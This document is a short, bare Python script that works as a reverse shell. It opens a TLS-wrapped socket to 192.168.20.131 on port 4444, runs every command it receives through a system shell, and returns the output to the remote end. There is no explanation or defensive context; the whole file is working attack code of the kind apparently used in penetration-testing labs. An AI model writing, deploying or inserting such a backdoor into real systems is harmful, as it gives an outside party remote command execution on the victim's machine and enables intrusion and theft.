import socket,subprocess,os,ssl
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect(('192.168.20.131',4444))
s=ssl.wrap_socket(so)
vr=False
while not vr:
	data=s.recv(1024)
	if len(data)==0:
		vr = True
	proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
	stdout_value=proc.stdout.read() + proc.stderr.read()
	s.send(stdout_value)